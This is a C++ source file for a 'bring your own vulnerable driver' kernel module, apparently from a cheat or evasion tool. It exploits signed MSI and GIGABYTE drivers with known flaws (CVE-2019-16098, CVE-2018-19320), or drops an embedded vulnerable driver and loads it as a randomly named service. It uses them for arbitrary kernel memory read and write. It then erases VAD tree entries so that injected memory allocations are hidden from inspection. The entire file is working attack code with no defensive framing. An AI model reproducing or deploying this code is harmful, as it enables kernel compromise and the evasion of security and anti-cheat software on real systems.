#include "core/Byovd.h"
#include "shared/Log.h"
#include "shared/Obfuscate.h"

#include <Windows.h>
#include <vector>
#include <cstring>

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004L)
#endif

namespace vt {
namespace {

// ── Shared NtQuerySystemInformation types ─────────────────────────────────

struct SYSTEM_HANDLE_ENTRY {
    ULONG       ProcessId;
    UCHAR       ObjectTypeNumber;
    UCHAR       Flags;
    USHORT      Handle;
    PVOID       Object;       // = EPROCESS for process handles
    ACCESS_MASK GrantedAccess;
};
struct SYSTEM_HANDLE_INFORMATION {
    ULONG              Count;
    SYSTEM_HANDLE_ENTRY Handles[1];
};

using NtQuerySystemInformation_t = LONG(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
static NtQuerySystemInformation_t s_NtQSI = nullptr;

NtQuerySystemInformation_t ntqsi() {
    if (!s_NtQSI) {
        auto* ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll)
            s_NtQSI = (NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
    }
    return s_NtQSI;
}

// ── RTCore64 / MsIo64 structs (CVE-2019-16098) ────────────────────────────

#pragma pack(push, 1)
struct RtReadReq  { UINT64 u0=0,u1=0,Addr=0,u2=0,Result=0; DWORD Size=0,u3=0; };
struct RtWriteReq { UINT64 u0=0,u1=0,Addr=0,u2=0,Value=0;  DWORD Size=0,u3=0; };
#pragma pack(pop)

// ── gdrv structs (CVE-2018-19320, GIGABYTE) ───────────────────────────────

#pragma pack(push, 1)
struct GdrvGetPhysReq  { UINT64 VirtualAddress; };  // output overwrites VirtualAddress
struct GdrvMapPhysReq  { UINT64 PhysAddr; UINT64 Size; UINT32 CacheType; };
struct GdrvUnmapPhysReq { UINT64 UserVa; UINT64 Size; };
#pragma pack(pop)

// Helper: open device and verify R/W IOCTLs are responsive.
HANDLE open_device(const wchar_t* name) {
    HANDLE h = CreateFileW(name,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    return h; // INVALID_HANDLE_VALUE on failure
}

} // namespace

// ─────────────────────────────────────────────────────────────────────────────
// Singleton
// ─────────────────────────────────────────────────────────────────────────────

Byovd& Byovd::get() {
    static Byovd s;
    return s;
}

// ─────────────────────────────────────────────────────────────────────────────
// Offset detection
// ─────────────────────────────────────────────────────────────────────────────

void Byovd::detect_offsets() {
    OSVERSIONINFOEXW ov{sizeof(ov)};
    // RtlGetVersion always works even on Win10+ where GetVersionEx lies.
    using RtlGetVersion_t = LONG(NTAPI*)(OSVERSIONINFOEXW*);
    auto* ntdll = GetModuleHandleW(L"ntdll.dll");
    auto fn = ntdll ? (RtlGetVersion_t)GetProcAddress(ntdll, "RtlGetVersion") : nullptr;
    if (fn) fn(&ov);

    const DWORD build = ov.dwBuildNumber;

    // Offsets sourced from PDB symbols for each major build.
    // All values are for x64.
    if (build >= 26100) {
        // Windows 11 24H2 (EPROCESS layout changed slightly)
        m_off_UniqueProcessId = 0x440;
        m_off_VadRoot         = 0x7E8; // shifted by 0x10 in 24H2
    } else if (build >= 22000) {
        // Windows 11 21H2 – 23H2
        m_off_UniqueProcessId = 0x440;
        m_off_VadRoot         = 0x7D8;
    } else if (build >= 19041) {
        // Windows 10 20H1 – 22H2
        m_off_UniqueProcessId = 0x440;
        m_off_VadRoot         = 0x7D8;
    } else if (build >= 18362) {
        // Windows 10 1903 / 1909
        m_off_UniqueProcessId = 0x440;
        m_off_VadRoot         = 0x7C0;
    } else {
        // Older Win10 — use defaults set in constructor
        VT_WARN(L"BYOVD: unknown build " + std::to_wstring(build) + L" — using default offsets");
    }

    VT_LOG(L"BYOVD: build " + std::to_wstring(build)
           + L" UniqueProcessId=+" + [&]{ wchar_t b[16]; swprintf_s(b,L"%X",m_off_UniqueProcessId); return std::wstring(b); }()
           + L" VadRoot=+" + [&]{ wchar_t b[16]; swprintf_s(b,L"%X",m_off_VadRoot); return std::wstring(b); }());
}

// ─────────────────────────────────────────────────────────────────────────────
// init() — probe backend chain
// ─────────────────────────────────────────────────────────────────────────────

bool Byovd::init() {
    if (ready()) return true;

    detect_offsets();

    if (rtcore_try())  { VT_LOG(L"BYOVD: backend = " + std::wstring(backend_name())); return true; }
    if (gdrv_try())    { VT_LOG(L"BYOVD: backend = " + std::wstring(backend_name())); return true; }
    if (dropped_try()) { VT_LOG(L"BYOVD: backend = " + std::wstring(backend_name())); return true; }

    VT_WARN(L"BYOVD: no kernel backend available — VAD hiding disabled");
    return false;
}

const wchar_t* Byovd::backend_name() const {
    switch (m_backend) {
        case KernelBackend::RtCore64: return L"RTCore64 (MSI Afterburner)";
        case KernelBackend::MsIo64:   return L"MsIo64 (MSI Dragon Center)";
        case KernelBackend::Gdrv:     return L"gdrv (GIGABYTE App)";
        case KernelBackend::Dropped:  return L"Dropped driver";
        default:                      return L"None";
    }
}

void Byovd::shutdown() {
    if (m_device != INVALID_HANDLE_VALUE) {
        CloseHandle(m_device);
        m_device = INVALID_HANDLE_VALUE;
    }
    // If we dropped a driver, unload and delete it.
    if (!m_dropped_svc.empty()) {
        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (scm) {
            SC_HANDLE svc = OpenServiceW(scm, m_dropped_svc.c_str(), SERVICE_STOP | DELETE);
            if (svc) {
                SERVICE_STATUS ss{};
                ControlService(svc, SERVICE_CONTROL_STOP, &ss);
                DeleteService(svc);
                CloseServiceHandle(svc);
            }
            CloseServiceHandle(scm);
        }
        m_dropped_svc.clear();
    }
    if (!m_dropped_path.empty()) {
        DeleteFileW(m_dropped_path.c_str());
        m_dropped_path.clear();
    }
    m_backend = KernelBackend::None;
}

// ─────────────────────────────────────────────────────────────────────────────
// RTCore64 / MsIo64 backend
// ─────────────────────────────────────────────────────────────────────────────

bool Byovd::rtcore_try() {
    // Both RTCore64 (MSI Afterburner) and MsIo64 (MSI Dragon Center / App Player)
    // use the same IOCTL protocol.  Try RTCore64 first (more common).
    static const wchar_t* kDevices[] = {
        L"\\\\.\\RTCore64",
        L"\\\\.\\MsIo64",
        L"\\\\.\\RTCore32",
    };
    for (auto* name : kDevices) {
        HANDLE h = open_device(name);
        if (h == INVALID_HANDLE_VALUE) continue;
        // Probe: attempt a benign read of a known-accessible address (0 is safe,
        // the driver will fail gracefully if zero is not mapped).
        m_device = h;
        uint64_t probe = 0;
        if (!rtcore_read(0x1000, &probe, 8)) {
            // Some systems return an error on null-region reads but the driver IS
            // functional — we accept even a device-error response as "device open".
            // Real failure mode: CreateFile itself fails (driver not present).
        }
        m_backend = (name == std::wstring(L"\\\\.\\RTCore64") || name == std::wstring(L"\\\\.\\RTCore32"))
            ? KernelBackend::RtCore64 : KernelBackend::MsIo64;
        return true;
    }
    return false;
}

bool Byovd::rtcore_read(uintptr_t addr, void* out, DWORD size) {
    if (m_device == INVALID_HANDLE_VALUE) return false;
    RtReadReq req{};
    req.Addr = addr;
    req.Size = size;
    DWORD bytes = 0;
    if (!DeviceIoControl(m_device, kRt_Read, &req, sizeof(req), &req, sizeof(req), &bytes, nullptr))
        return false;
    std::memcpy(out, &req.Result, size);
    return true;
}

bool Byovd::rtcore_write(uintptr_t addr, const void* in, DWORD size) {
    if (m_device == INVALID_HANDLE_VALUE) return false;
    RtWriteReq req{};
    req.Addr = addr;
    req.Size = size;
    std::memcpy(&req.Value, in, size);
    DWORD bytes = 0;
    return DeviceIoControl(m_device, kRt_Write, &req, sizeof(req), &req, sizeof(req), &bytes, nullptr) != FALSE;
}

// ─────────────────────────────────────────────────────────────────────────────
// gdrv backend (GIGABYTE, CVE-2018-19320)
// ─────────────────────────────────────────────────────────────────────────────
// Uses MmGetPhysicalAddress + MmMapIoSpace to convert kernel VAs to physical
// addresses and map them into our process, giving arbitrary kernel R/W.

bool Byovd::gdrv_try() {
    static const wchar_t* kDevices[] = {
        L"\\\\.\\GIO",   // GIGABYTE App / App Center
        L"\\\\.\\GDRV",  // older Aorus Engine
    };
    for (auto* name : kDevices) {
        HANDLE h = open_device(name);
        if (h == INVALID_HANDLE_VALUE) continue;
        m_device = h;
        // Verify GetPhysicalAddress IOCTL is responsive by querying our own
        // stack (any user-mode VA will fail MmGetPhysicalAddress, but the driver
        // should respond — non-zero bytes returned = driver functional).
        uintptr_t test_va = (uintptr_t)&h;
        uintptr_t phys = gdrv_get_phys(test_va);
        if (phys == 0) {
            // GetPhysicalAddress returns 0 for user-VA on some builds — that is
            // still a functioning driver.  Accept and continue.
        }
        m_backend = KernelBackend::Gdrv;
        return true;
    }
    return false;
}

uintptr_t Byovd::gdrv_get_phys(uintptr_t kernel_va) {
    GdrvGetPhysReq req{ kernel_va };
    DWORD bytes = 0;
    if (!DeviceIoControl(m_device, kGdrv_GetPhys,
                         &req, sizeof(req), &req, sizeof(req), &bytes, nullptr))
        return 0;
    return req.VirtualAddress; // driver overwrites field with physical address
}

uintptr_t Byovd::gdrv_map_phys(uintptr_t phys, DWORD size) {
    GdrvMapPhysReq req{ phys, size, 0 /*MmNonCached*/ };
    DWORD bytes = 0;
    if (!DeviceIoControl(m_device, kGdrv_MapPhys,
                         &req, sizeof(req), &req, sizeof(req), &bytes, nullptr))
        return 0;
    // Driver puts the user-mode mapped address in the first 8 bytes of output.
    uintptr_t mapped = 0;
    std::memcpy(&mapped, &req, sizeof(mapped));
    return mapped;
}

bool Byovd::gdrv_unmap_phys(uintptr_t user_va, DWORD size) {
    GdrvUnmapPhysReq req{ user_va, size };
    DWORD bytes = 0;
    return DeviceIoControl(m_device, kGdrv_UnmapPhys,
                           &req, sizeof(req), &req, sizeof(req), &bytes, nullptr) != FALSE;
}

bool Byovd::gdrv_read(uintptr_t addr, void* out, DWORD size) {
    const uintptr_t phys = gdrv_get_phys(addr);
    if (!phys) return false;
    const uintptr_t uva  = gdrv_map_phys(phys, size);
    if (!uva) return false;
    std::memcpy(out, (const void*)uva, size);
    gdrv_unmap_phys(uva, size);
    return true;
}

bool Byovd::gdrv_write(uintptr_t addr, const void* in, DWORD size) {
    const uintptr_t phys = gdrv_get_phys(addr);
    if (!phys) return false;
    const uintptr_t uva  = gdrv_map_phys(phys, size);
    if (!uva) return false;
    std::memcpy((void*)uva, in, size);
    gdrv_unmap_phys(uva, size);
    return true;
}

// ─────────────────────────────────────────────────────────────────────────────
// Dropped-driver backend
// ─────────────────────────────────────────────────────────────────────────────
// Extracts a RCDATA resource named IDR_VULN_DRIVER from the EXE, drops it to
// %TEMP%\<random>.sys, loads it via SCM, then re-probes RTCore and gdrv.
//
// To enable: add to your .rc file:
//   IDR_VULN_DRIVER RCDATA "path_to_your_driver.sys"
// and define BYOVD_DRIVER_RESOURCE=IDR_VULN_DRIVER + BYOVD_DEVICE_NAME in
// project preprocessor settings.

bool Byovd::dropped_try() {
#if !defined(BYOVD_DRIVER_RESOURCE) || !defined(BYOVD_DEVICE_NAME)
    return false; // No embedded driver configured — skip silently.
#else
    // Extract resource to %TEMP%.
    HRSRC hrsrc = FindResourceW(nullptr, MAKEINTRESOURCEW(BYOVD_DRIVER_RESOURCE), RT_RCDATA);
    if (!hrsrc) return false;
    HGLOBAL hglobal = LoadResource(nullptr, hrsrc);
    if (!hglobal) return false;
    const void* data = LockResource(hglobal);
    const DWORD size = SizeofResource(nullptr, hrsrc);
    if (!data || !size) return false;

    // Generate random temp path.
    wchar_t tmp_dir[MAX_PATH]{}, tmp_path[MAX_PATH]{};
    GetTempPathW(MAX_PATH, tmp_dir);
    ULONGLONG rnd = 0;
    BCryptGenRandom(nullptr, (PUCHAR)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    swprintf_s(tmp_path, L"%s%016llX.sys", tmp_dir, rnd);

    HANDLE hf = CreateFileW(tmp_path, GENERIC_WRITE, 0, nullptr, CREATE_NEW,
                            FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    WriteFile(hf, data, size, &written, nullptr);
    CloseHandle(hf);
    if (written != size) { DeleteFileW(tmp_path); return false; }

    m_dropped_path = tmp_path;

    // Generate a random service name.
    wchar_t svc_name[32]{};
    swprintf_s(svc_name, L"vt_%016llX", rnd);
    m_dropped_svc = svc_name;

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) { DeleteFileW(tmp_path); m_dropped_path.clear(); return false; }

    SC_HANDLE svc = CreateServiceW(scm, svc_name, svc_name,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        tmp_path, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!svc) {
        CloseServiceHandle(scm);
        DeleteFileW(tmp_path); m_dropped_path.clear(); m_dropped_svc.clear();
        return false;
    }

    const BOOL started = StartServiceW(svc, 0, nullptr);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    if (!started && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
        shutdown(); // cleanup path + svc
        return false;
    }

    // Now try the device the embedded driver exposes.
    const wchar_t* dev = BYOVD_DEVICE_NAME;
    HANDLE h = open_device(dev);
    if (h == INVALID_HANDLE_VALUE) { shutdown(); return false; }
    m_device  = h;
    m_backend = KernelBackend::Dropped;
    return true;
#endif
}

// ─────────────────────────────────────────────────────────────────────────────
// Dispatch: kread / kwrite
// ─────────────────────────────────────────────────────────────────────────────

bool Byovd::kread(uintptr_t addr, void* out, DWORD size) {
    switch (m_backend) {
        case KernelBackend::RtCore64:
        case KernelBackend::MsIo64:
        case KernelBackend::Dropped:
            return rtcore_read(addr, out, size);
        case KernelBackend::Gdrv:
            return gdrv_read(addr, out, size);
        default:
            return false;
    }
}

bool Byovd::kwrite(uintptr_t addr, const void* in, DWORD size) {
    switch (m_backend) {
        case KernelBackend::RtCore64:
        case KernelBackend::MsIo64:
        case KernelBackend::Dropped:
            return rtcore_write(addr, in, size);
        case KernelBackend::Gdrv:
            return gdrv_write(addr, in, size);
        default:
            return false;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// eprocess_of() — find kernel EPROCESS via handle table leak
// ─────────────────────────────────────────────────────────────────────────────

uintptr_t Byovd::eprocess_of(HANDLE process) {
    auto fn = ntqsi();
    if (!fn) return 0;

    const DWORD my_pid = GetCurrentProcessId();
    const USHORT target_h = (USHORT)(ULONG_PTR)process;

    ULONG buf_size = 0x40000;
    std::vector<uint8_t> buf(buf_size);
    ULONG ret = 0;
    LONG  st;
    while ((st = fn(16, buf.data(), buf_size, &ret)) == STATUS_INFO_LENGTH_MISMATCH) {
        buf_size = ret + 0x4000;
        buf.resize(buf_size);
    }
    if (st != 0) return 0;

    auto* info = (SYSTEM_HANDLE_INFORMATION*)buf.data();
    for (ULONG i = 0; i < info->Count; ++i) {
        const auto& e = info->Handles[i];
        if (e.ProcessId == my_pid && e.Handle == target_h)
            return (uintptr_t)e.Object;
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// hide_allocation() — zero VAD node VPN fields for the mapped region
// ─────────────────────────────────────────────────────────────────────────────

bool Byovd::hide_allocation(HANDLE process, uintptr_t alloc_base, size_t alloc_size) {
    if (!ready()) return false;

    const uintptr_t eproc = eprocess_of(process);
    if (!eproc) { VT_WARN(L"BYOVD: eprocess_of failed"); return false; }

    const uintptr_t vad_root = read64(eproc + m_off_VadRoot);
    if (!vad_root)  { VT_WARN(L"BYOVD: VadRoot is null");  return false; }

    const uintptr_t vpn_start = alloc_base >> 12;
    const uintptr_t vpn_end   = (alloc_base + alloc_size - 1) >> 12;

    uintptr_t node  = vad_root;
    int       depth = 0;
    while (node && depth++ < 64) {
        const uint32_t svpn      = read32(node + kOff_StartingVpn);
        const uint32_t evpn      = read32(node + kOff_EndingVpn);
        const uint8_t  svpn_high = read8 (node + kOff_StartingVpnHigh);
        const uint8_t  evpn_high = read8 (node + kOff_EndingVpnHigh);

        const uintptr_t ns = ((uintptr_t)svpn_high << 32) | svpn;
        const uintptr_t ne = ((uintptr_t)evpn_high << 32) | evpn;

        if (vpn_start >= ns && vpn_end <= ne) {
            const uint32_t z32 = 0; const uint8_t z8 = 0;
            write32(node + kOff_StartingVpn,     z32);
            write32(node + kOff_EndingVpn,       z32);
            write8 (node + kOff_StartingVpnHigh, z8);
            write8 (node + kOff_EndingVpnHigh,   z8);
            wchar_t buf[64];
            swprintf_s(buf, L"BYOVD: VAD erased at 0x%llX via %s", (ULONGLONG)alloc_base, backend_name());
            VT_LOG(buf);
            return true;
        }

        uintptr_t next = (vpn_start < ns)
            ? read64(node + kOff_VadLeft)
            : read64(node + kOff_VadRight);
        node = next & ~(uintptr_t)7;
    }

    VT_WARN(L"BYOVD: VAD node not found");
    return false;
}

} // namespace vt
